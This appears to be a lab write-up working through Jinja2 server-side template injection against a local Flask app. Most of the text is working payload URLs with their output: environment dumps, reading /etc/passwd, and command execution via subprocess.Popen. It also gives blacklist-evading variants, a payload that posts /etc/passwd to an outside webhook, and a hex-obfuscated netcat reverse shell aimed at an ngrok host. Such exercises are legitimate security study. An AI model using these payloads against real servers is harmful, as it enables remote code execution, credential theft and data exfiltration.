Q: Give unique ssti payloads for the given cases while following these conditions:
 Re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]

```
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route("/")
def home():
    if request.args.get("c"):
        return render_template_string(request.args.get("c"))
    else:
        return "Hello, send someting inside the param 'c'!"


if __name__ == "__main__":
    app.run()
```

- ## Return the index of urllib in subclasses()
  
```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here

```http://127.0.0.1:5000/?c={{().__class__.__base__}}``` : ```<class 'object'>```

```http://127.0.0.1:5000/?c={{().__class__.__base__.__subclasses__()}}``` : ```[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>``` : returns all the subclasses for that object<br>

Now to get the index at which the urllib is present, we can copy the list and iterate through it or to directly run it in the browser we can use a for loop:
```
{% set subclasses = ().__class__.__base__.__subclasses__() %}
{% for i in range(subclasses|length) %}
  {% if 'urllib' in subclasses[i].__module__ %}
    {{ i }}
  {% endif %}
{% endfor %}
```
If this is our payload, then the for loop iterates through the subclasses list and prints the index wherever it finds urllib mentioned
url encoding the block we get the payload as: 
PAYLOAD:
```
%7B%25%20set%20subclasses%20%3D%20().__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20for%20i%20in%20range(subclasses%7Clength)%20%25%7D%0A%20%20%7B%25%20if%20'urllib'%20in%20subclasses%5Bi%5D.__module__%20%25%7D%0A%20%20%20%20%7B%7B%20i%20%7D%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

![image](https://github.com/poorvi1910/Web/assets/146640913/433ab890-0a54-4476-a97c-725822933382)

FOR BLACKLIST: 
```
http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f%22))()%20}}
```

- ##  Get name of current python flask script
Didnt get the name of the exact script but got the directory:
```
http://127.0.0.1:5000/?c={{%27%27.__class__.mro()[1].__subclasses__()[396](%27pwd%27,shell=True,stdout=-1).communicate()[0].strip()}}
```

- ## Get all the current envvars
```http://127.0.0.1:5000/?c={{config}}```: ```<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None,```
```http://127.0.0.1:5000/?c={{config.__class__}}``` : ```<class 'flask.config.Config'>```
```http://127.0.0.1:5000/?c={{config.__class__.from_envvar}}```: ```<function Config.from_envvar at 0x7facac89bf60>```
```http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22]}}```: ```{'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facac8a3190>, ...```

PAYLOAD:
```
http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22][%22__builtins__%22][%22__import__%22](%22os%22).environ}}
```
![image](https://github.com/poorvi1910/Web/assets/146640913/de0b5534-d6a5-41aa-9c42-c4d4493f7a61)

BLACKLIST:
```
http://127.0.0.1:5000/?c={{config.from_envvar[%27\x5f\x5fglobals\x5f\x5f%27][%27\x5f\x5fbuiltins\x5f\x5f%27][%27\x5f\x5fimport\x5f\x5f%27](%27os%27).environ}}
```

- ##  Read a local file

```http://127.0.0.1:5000/?c={{%20request.__class__}}``` : ```<class 'flask.wrappers.Request'>```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data}}``` : ```<function Request._load_form_data at 0x7facac724680>```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__}}``` : ```{'__name__': 'flask.wrappers', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facac720f90>...```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__}}``` : ```{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python...```

PAYLOAD:
```
http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
```
![image](https://github.com/poorvi1910/Web/assets/146640913/dba77ed3-b558-41bc-8740-12d3d668d256)


- ##  Run a command

```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here

```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568]}}``` : ```<class 'subprocess.Popen'>``` : selecting the popen subprocess

```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}``` :  running cat command on a python file to read it

PAYLOAD:
```
http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}
```
![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)

- ##  Send the contents of etc pass to  awebhook

Sending post request: ```http://127.0.0.1:5000/?c={{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]('requests')['post']['__call__']```

To read file : ```request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()```

Final result : ```<Response [200]>```

PAYLOAD:
```
http://127.0.0.1:5000/?c={{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]('requests')['post']['__call__']('https://webhook-test.com/862d0fdb235354934d78409cb297c53c', data={'file': request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()}) }}
```
![image](https://github.com/poorvi1910/Web/assets/146640913/65bde4dc-928b-423c-9fc8-48ca1d5ecbe1)



- ##  Create a reverse shell, save your work and run the command yes on the rev shell

tried 
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil'+'tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp'+'ort\x5f\x5f')('os')|attr('pop'+'en')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x38\x2e\x74\x63\x70\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x35\x37\x32\x33\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```
did not get an output on terminal though
